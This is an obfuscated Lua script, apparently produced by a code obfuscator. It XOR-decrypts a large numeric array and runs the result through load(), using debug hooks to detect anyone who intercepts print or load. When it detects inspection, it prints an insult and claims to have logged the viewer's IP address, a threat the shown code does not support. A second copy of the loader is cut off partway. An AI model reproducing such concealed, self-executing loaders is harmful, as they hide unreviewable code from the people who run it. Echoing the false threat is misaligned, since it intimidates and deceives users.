tKpuO9nRrgNowRyz4iHtoH3wQtVvuVtkrT1EM28e4ao3gc8v2HyTwC9cxnGzTUG0KCI1; rw6kMY6mU4XB4062HdO90gVDlIxK60Kw7ha1Qz7NohFvWC07vV5jKOWAm3Sp47u =
toIXnxkn1QeM7qhKTxgs7JgvDQrPhjF0BO9qbFS0dUWsbx5qMbLJZ; b2TJqohHRJwwIkxRRkHqghTdM4LwHtltxC3huW8Li24O3cVAn5vxC0cpvH =
rw6kMY6mU4XB4062HdO90gVDlIxK60Kw7ha1Qz7NohFvWC07vV5jKOWAm3Sp47u; n1IXKBDcPzi2zdfFHSEYhGp2mIMYNykn5IJC0HPXcAZWAv84vwRr1Xrvv2AZvAXFVZ =
b2TJqohHRJwwIkxRRkHqghTdM4LwHtltxC3huW8Li24O3cVAn5vxC0cpvH; fujj4IFAXB6C3FqrMFCL16Xjfgvrxuj8FZM3gtr7lI2Fc6dVwdwxA =
n1IXKBDcPzi2zdfFHSEYhGp2mIMYNykn5IJC0HPXcAZWAv84vwRr1Xrvv2AZvAXFVZ; l4skgpOe38KPyeaHYSd95H9PVld189SDy93WvAq5WxJydKpZYyT9hwnHaMBHlWBwAl3Ou =
fujj4IFAXB6C3FqrMFCL16Xjfgvrxuj8FZM3gtr7lI2Fc6dVwdwxA; er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI =
l4skgpOe38KPyeaHYSd95H9PVld189SDy93WvAq5WxJydKpZYyT9hwnHaMBHlWBwAl3Ou; lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5 = function(
  a)
  K, F = 5881069413095499, 16384 + 5994; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; sX9FBi8EGboalXs4m8QATOpMtE66iYf0xxOlmuZoIdCCjIeK5TnKo1df1UgRb5UgPVboKs = function(b)
  co = coroutine.create(b)
  hat7gmv0nmjt5Q01CBPKjtE8iT4MCegcGIEO5l0NuXcl5AbG54V9dlZ1Kglz = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(hat7gmv0nmjt5Q01CBPKjtE8iT4MCegcGIEO5l0NuXcl5AbG54V9dlZ1Kglz, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return hat7gmv0nmjt5Q01CBPKjtE8iT4MCegcGIEO5l0NuXcl5AbG54V9dlZ1Kglz
end; u7rg32PiCVQg2luxcHeEuJgTuG9Zkgvv9DzfInPH37Jf9almEFoHLJiiFnrnjWTe8 = function(f, g)
  xkKW60XZiho1LHPWyaASTwQDoPAaOlstLKF4r24prObTvggiz7KAJfS = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; iOFG96UTwBEGqfU9cYDgb1RKfmkcJHb7pwgleYn45fEbSdUZl9DiAj8VFm5 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; s1lt40xz9NH6Ui10W6jDo9UyjCiXEMiBdTrkgOpiDMNiMfkEDZ7Me = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      xkKW60XZiho1LHPWyaASTwQDoPAaOlstLKF4r24prObTvggiz7KAJfS(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; aS99F6MPnCuFLQre0pT0IJEG2uWaCeeQPpGam2NNvFOa3Q7yyxAgG5hd5p6o7nwUkDyLtl = function(p, n)
    yqQG2wBSN8iWT3lKxY0FmtUUAD4ARutZXTX22UA8MVaCOkCHqpup0M5nrZIDwAMCu1 = ""
    for k, q in pairs(p) do yqQG2wBSN8iWT3lKxY0FmtUUAD4ARutZXTX22UA8MVaCOkCHqpup0M5nrZIDwAMCu1 =
      yqQG2wBSN8iWT3lKxY0FmtUUAD4ARutZXTX22UA8MVaCOkCHqpup0M5nrZIDwAMCu1 ..
      er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI
      [lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('2E') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('C5') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('97') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('48') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('3B') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('1A')]
      [lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('BE') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('B1') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('90') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('97')](
      q) end
    ; n(yqQG2wBSN8iWT3lKxY0FmtUUAD4ARutZXTX22UA8MVaCOkCHqpup0M5nrZIDwAMCu1)
  end; iOFG96UTwBEGqfU9cYDgb1RKfmkcJHb7pwgleYn45fEbSdUZl9DiAj8VFm5(f,
    function(r) s1lt40xz9NH6Ui10W6jDo9UyjCiXEMiBdTrkgOpiDMNiMfkEDZ7Me(r, g,
        function(s) aS99F6MPnCuFLQre0pT0IJEG2uWaCeeQPpGam2NNvFOa3Q7yyxAgG5hd5p6o7nwUkDyLtl(s,
            function(t) if #sX9FBi8EGboalXs4m8QATOpMtE66iYf0xxOlmuZoIdCCjIeK5TnKo1df1UgRb5UgPVboKs(er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI[lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('0D') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('D2') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('90') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('55')]) == 1 then if er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI[lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('0D') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('D2') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('90') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('55')] == er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI[lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('69') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('97') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('48') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('3B') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('C5')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI[lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('0D') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('D2') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('90') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('55')](t) then
                    er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI
                        [lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('0D') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('D2') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('90') .. lR17PmROE8Ja5m9JMvuc66NCABsR9Ox8SEV3SnimgGjnPwbG0UhTFGnZoI5('55')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; u7rg32PiCVQg2luxcHeEuJgTuG9Zkgvv9DzfInPH37Jf9almEFoHLJiiFnrnjWTe8(
{ 956, 1003, 853, 882, 892, 866, 710, 1013, 903, 1002, 1174, 1054, 674, 1195, 958, 943, 1049, 627, 927, 1208, 1107, 755,
  743, 915, 761, 1060, 800, 608, 939, 980, 1034, 649, 666, 1111, 883, 612, 744, 551, 837, 1101, 1006, 820, 1024, 661,
  992, 806, 1019, 572, 1094, 1127, 700, 1190, 716, 678, 1193, 1177, 1124, 759, 1168, 613, 1009, 870, 832, 1102, 735, 829,
  875, 599, 926, 703, 1206, 1076, 719, 863, 690, 969, 936, 1200, 916, 804, 1189, 1082, 812, 878, 994, 1072, 730, 595,
  973, 593, 650, 1035, 1075, 1052, 697, 600, 886, 879, 767, 1068, 698, 729, 1151, 841, 662, 828, 809, 1145, 821, 1117,
  1036, 997, 603, 934, 788, 1112, 1055, 843, 580, 1169, 948, 952, 961, 688, 740, 1142, 628, 1033, 858, 1097, 1069, 1167,
  1071, 1014, 732, 564, 918, 938, 660, 1130, 635, 987, 1081, 765, 1184, 738, 908, 1011, 1172, 591, 714, 946, 1015, 741,
  578, 623, 1155, 693, 559, 1159, 1098, 699, 928, 626, 736, 951, 586, 1126, 1106, 1031, 682, 610, 944, 676, 1188, 845,
  1057, 1037, 632, 773, 1074, 570, 1080, 847, 1070, 1008, 1122, 544, 1147, 778, 789, 1020, 1051, 1030, 924, 669, 691,
  1182, 857, 1211, 846, 1139, 1120, 1089, 960, 1001, 1149, 1032, 876, 1007, 685, 802, 823, 1050, 656, 1178, 811, 715,
  720, 728, 668, 638, 630, 1164, 836, 856, 1154, 713, 1016, 620, 588, 695, 1121, 825, 1042, 763, 684, 1140, 1187, 573,
  978, 902, 923, 607, 906, 852, 954, 689, 974, 977, 1040, 808, 751, 1046, 1199, 731, 601, 831, 771, 1059, 604, 957, 1162,
  576, 692, 597, 776, 881, 1018, 633, 1062, 972, 982, 872, 701, 598, 822, 653, 705, 1163, 1183, 658, 561, 901, 865, 1066,
  681, 1061, 673, 1194, 897, 781, 854, 1025, 890, 1150, 1103, 589, 869, 819, 1133, 718, 625, 855, 862, 753, 1029, 965,
  921, 582, 547, 696, 986, 911, 1079, 912, 652, 1202, 609, 727, 922, 1170, 919, 818, 929, 624, 1077, 555, 848, 750, 558,
  766, 1096, 1123, 566, 611, 1201, 838, 935, 784, 981, 622, 1141, 833, 670, 562, 675, 1138, 817, 606, 733, 563, 1064,
  889, 955, 995, 798, 917, 1171, 887, 964, 1157, 581, 880, 984, 1110, 941, 619, 663, 842, 999, 920, 677, 891, 1010, 1045,
  1186, 560, 940, 794, 1041, 942, 909, 746, 1084, 937, 787, 884, 711, 1083, 989, 639, 1086, 910, 722, 569, 791, 737, 803,
  1119, 1129, 873, 786, 1078, 645, 712, 1105, 1004, 655, 947, 679, 813, 565, 1132, 726, 976, 799, 905, 724, 651, 1043,
  1148, 871, 1181, 780, 634, 1067, 896, 839, 584, 636, 758, 783, 900, 844, 554, 1012, 659, 860, 1179, 1114, 592, 1039,
  996, 647, 796, 721, 590, 665, 899, 772, 723, 775, 770, 549, 907, 585, 1153, 851, 1095, 657, 1185, 1136, 1113, 1180,
  801, 1118, 545, 760, 1203, 706, 894, 932, 543, 867, 931, 680, 648, 1073, 953, 1044, 1158, 983, 1063, 618, 704, 1156,
  782, 717, 574, 615, 1176, 725, 583, 571, 550, 762, 742, 877, 998, 1115, 1047, 1093, 557, 774, 795, 1038, 1166, 1161,
  785, 975, 1175, 814, 797, 546, 594, 745, 834, 885, 621, 1160, 967, 1116, 824, 1146, 748, 1143, 752, 556, 1212, 1198,
  898, 849, 1099, 959, 768, 754, 552, 1022, 686, 708, 925, -1, 16, 23, 49, 43, 0, 85, 11, 84, 88, 127, 64, 86, 123, 67,
  109, 106, 116, 80, 29, 45, 80, 91, 90, 88, 232, 72, 89, 120, 86, 32, 65, 108, 144, 5, 212, 94, 237, 10, 17, 15, 116,
  80, 82, 121, 149, 23, 7, 66, 16, 116, 29, 40, 62, 193, 83, 52, 33, 122, 11, 185, 1, 4, 38, 123, 101, 27, 70, 99, 74,
  46, 50, 54, 88, 36, 168, 49, 95, 42, 116, 7, 115, 2, 58, 126, 37, 29, 120, 90, 206, 64, 62, 109, 35, 25, 193, 122, 0,
  204, 84, 169, 125, 189, 23, 246, 115, 109, 66, 6, 66, 8, 58, 194, 34, 88, 62, 43, 47, 18, 53, 86, 80, 243, 3, 6, 7, 5,
  67, 74, 187, 220, 108, 56, 12, 100, 68, 1, 102, 68, 30, 93, 187, 35, 127, 14, 55, 76, 4, 95, 66, 94, 65, 245, 24, 38,
  115, 2, 5, 82, 31, 239, 53, 56, 47, 122, 184, 42, 125, 24, 30, 51, 14, 99, 100, 86, 100, 39, 33, 106, 4, 80, 99, 115,
  82, 82, 121, 21, 74, 1, 41, 80, 74, 172, 30, 72, 121, 59, 29, 109, 77, 12, 13, 40, 29, 75, 209, 84, 160, 118, 44, 121,
  2, 115, 42, 55, 166, 61, 81, 94, 17, 54, 0, 197, 0, 75, 52, 117, 157, 25, 17, 3, 91, 106, 41, 5, 251, 97, 250, 68, 13,
  97, 48, 84, 61, 80, 10, 57, 81, 58, 4, 106, 133, 114, 81, 17, 8, 106, 25, 31, 19, 69, 16, 24, 124, 67, 252, 121, 58,
  37, 25, 30, 98, 98, 62, 28, 36, 21, 80, 114, 80, 61, 67, 7, 28, 111, 160, 19, 24, 43, 15, 45, 68, 67, 163, 116, 96, 61,
  74, 123, 59, 23, 25, 106, 71, 123, 70, 94, 77, 169, 49, 25, 54, 72, 53, 118, 120, 22, 189, 23, 89, 62, 115, 160, 92,
  95, 74, 67, 70, 35, 74, 2, 5, 102, 19, 78, 20, 95, 76, 59, 52, 16, 68, 74, 120, 106, 108, 34, 114, 74, 109, 22, 4, 104,
  186, 81, 20, 37, 55, 51, 30, 60, 44, 139, 126, 104, 2, 38, 106, 16, 84, 7, 147, 163, 4, 6, 75, 70, 43, 83, 80, 12, 23,
  88, 40, 116, 106, 92, 15, 0, 121, 80, 99, 109, 16, 82, 35, 121, 61, 90, 115, 118, 39, 109, 222, 125, 67, 116, 40, 21,
  106, 107, 81, 30, 116, 124, 29, 11, 90, 84, 98, 42, 142, 88, 34, 202, 84, 32, 70, 165, 68, 18, 47, 10, 53, 48, 104, 31,
  238, 74, 39, 31, 90, 18, 93, 90, 31, 193, 2, 49, 65, 40, 184, 74, 118, 90, 60, 58, 77, 148, 77, 57, 36, 53, 200, 90,
  83, 69, 13, 106, 37, 100, 52, 16, 76, 54, 178, 75, 99, 106, 183, 64, 104, 116, 121, 168, 216, 111, 43, 86, 92, 103, 4,
  5, 80, 24, 127, 74, 88, 123, 116, 2, 80, 74, 81, 2, 121, 193, 49, 1, 102, 122, 156, 1, 24, 200, 99, 154, 33, 32, 4, 47,
  114, 90, 140, 36, 106, 32, 124, 106, 60, 43, 106, 85, 71, 15, 9, 23, 39, 81, 74, 66, 49, 34, 45, 54, 208, 28, 107, 107,
  197, 231, 68, 23, 34, 100, 94, 87, 92, 151, 80, 81, 106, 61, 32, 77, 100, 196, 104, 17, 117, 18, 118, 23, 74, 115, 86,
  6, 40, 118, 31, 92, 108, 2, 179, 69, 6, 255, 50, 109, 30, 67, 28, 119, 157, 54, 156, 40, 83, 48, 8, 70, 70, 95, 4, 30,
  89, 16, 64, 99, 28, 223, 62, 26, 68, 46, 74, 80, 78, 86, 22, 61, 24, 114, 76, 80, 18, 9, 38, 40, 100, 98, 136, 62, 50,
  74, 1, 126, 14, 26, 121, 117, 107, 27, 14, 74, 21, 109, 41, 45, 94, 43, 115, 11, 21, 230, 71, 15, 40, 115, 82, 68, 93,
  8, 138, 37, 94, 86, 150, 48, 113, 10 }, "vtSbp0jYdMJqjpzRTVJkDLxjrT"); dhH4fZqciflXnN65Ev1EQx75qWdtgcU1lLbEmpnw6JKoxM3eCBohdQlBjLU2aOaPWza7dby8L =
er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI; mkLUtrSgFQk5VbwYVO2PIpiymrnjShQgI0facHhtZFFT7UWCNxFMW2RNxPI =
er9xMhex4H1uu2q8uNq4z0jc1eofE4tp9F9Fa27vUYP3EPXV9fONysEvZbZ65QeFI; w0JJoDkAOwRejPUs2jt7X5ZRZYAcOA2jADZll7VL6zivwc5mz35hrLEVaz0NSM9x =
mkLUtrSgFQk5VbwYVO2PIpiymrnjShQgI0facHhtZFFT7UWCNxFMW2RNxPI; tAunhpISAJCGcZnClByAp5LS74GMEEdqSbbGdnc0yvewJJ1j7LIzJFqGubdcg =
w0JJoDkAOwRejPUs2jt7X5ZRZYAcOA2jADZll7VL6zivwc5mz35hrLEVaz0NSM9x; ltkDsFHhG4F9yKG5QcaraeoqP067cnLS6EYitakuh0qExD1BMTLLv9Zc4aiBbyXt5Poe =
tAunhpISAJCGcZnClByAp5LS74GMEEdqSbbGdnc0yvewJJ1j7LIzJFqGubdcg; y6jR5lashhTxbVe7XgqBP5JsE9ZXcd9VAUZIm9UopBzLdUiPIGjFBKNvrg8kdkW =
ltkDsFHhG4F9yKG5QcaraeoqP067cnLS6EYitakuh0qExD1BMTLLv9Zc4aiBbyXt5Poe; rsinskYcIhi9bCQ4n6ZnUMXAIhOB6Ys5fIoa5G47LCWowiZUOoGxQQBeNR0XAP3YtrW =
y6jR5lashhTxbVe7XgqBP5JsE9ZXcd9VAUZIm9UopBzLdUiPIGjFBKNvrg8kdkW; iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD =
rsinskYcIhi9bCQ4n6ZnUMXAIhOB6Ys5fIoa5G47LCWowiZUOoGxQQBeNR0XAP3YtrW; ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM = function(
  a)
  K, F = 5424017516659674, 16384 + 1772; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; jDUa0aKSek2ZJpPZxEr6p8K0mPE89QGvsJH3ippdj3dm5jZ2QSfD6oB0tz = function(b)
  co = coroutine.create(b)
  xCImYgPxMD5A76hPUcXM83r6HFZXKJChvZHrpWiWpdpJcwXb3flJPE5Xd8U = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(xCImYgPxMD5A76hPUcXM83r6HFZXKJChvZHrpWiWpdpJcwXb3flJPE5Xd8U, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return xCImYgPxMD5A76hPUcXM83r6HFZXKJChvZHrpWiWpdpJcwXb3flJPE5Xd8U
end; gfdlqEelUC9p4XXZQ7PXZoPNs9X3l85osZh6na9QRW8mPAYpWGOijBayVuZwRymwOtRtVkE = function(f, g)
  oCjgQY4gD5GdCt357WebiloH2S0TaT3ipabXViwi7jKscx8SPx1cD1j2s3bw3 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; djAMOhpgWOXS4juV6WU3Bfb3tnolbTHNz2JrJGPle1sr3NEDwTfg1 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; rCy6Ky5ziKT2B4TQKUOHSEBOAzJZqckznibVMCYvOgddrmdsmzsT4TRC6TA3Sq1Ql2RQEGLNpeb = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      oCjgQY4gD5GdCt357WebiloH2S0TaT3ipabXViwi7jKscx8SPx1cD1j2s3bw3(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; hXHifay4zy3hOqV3gbE2qxbJJg3TaybHPnHfVkN09n26B6oM1YjM73lAJCmr = function(p, n)
    cV5WZkWUB020T6FIgwsyYXsFE7PnzD0kJpwu4wIZMa40a2aRoh9mRRxdLbwN60PReAOcBP = ""
    for k, q in pairs(p) do cV5WZkWUB020T6FIgwsyYXsFE7PnzD0kJpwu4wIZMa40a2aRoh9mRRxdLbwN60PReAOcBP =
      cV5WZkWUB020T6FIgwsyYXsFE7PnzD0kJpwu4wIZMa40a2aRoh9mRRxdLbwN60PReAOcBP ..
      iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD
      [ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('A1') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('BA') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('88') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('A7') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('24') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('75')]
      [ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('11') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('8E') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('DF') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('88')](
      q) end
    ; n(cV5WZkWUB020T6FIgwsyYXsFE7PnzD0kJpwu4wIZMa40a2aRoh9mRRxdLbwN60PReAOcBP)
  end; djAMOhpgWOXS4juV6WU3Bfb3tnolbTHNz2JrJGPle1sr3NEDwTfg1(f,
    function(r) rCy6Ky5ziKT2B4TQKUOHSEBOAzJZqckznibVMCYvOgddrmdsmzsT4TRC6TA3Sq1Ql2RQEGLNpeb(r, g,
        function(s) hXHifay4zy3hOqV3gbE2qxbJJg3TaybHPnHfVkN09n26B6oM1YjM73lAJCmr(s,
            function(t) if #jDUa0aKSek2ZJpPZxEr6p8K0mPE89QGvsJH3ippdj3dm5jZ2QSfD6oB0tz(iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD[ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('F2') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('3D') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('DF') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('2A')]) == 1 then if iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD[ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('F2') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('3D') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('DF') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('2A')] == iVoe0uofuiBQDVooHusUkwX9Gpli7S77Q9KgLuiUpCeLPnF3YIGaC76UTccD[ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('56') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('88') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('A7') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('24') .. ntljmid0w2YnQHdpfihphQV0T2WBB91i9mF6pGocp3DujGzKChDEGxM4HWe8LleRhbbDdM('BA')] then
                  print(
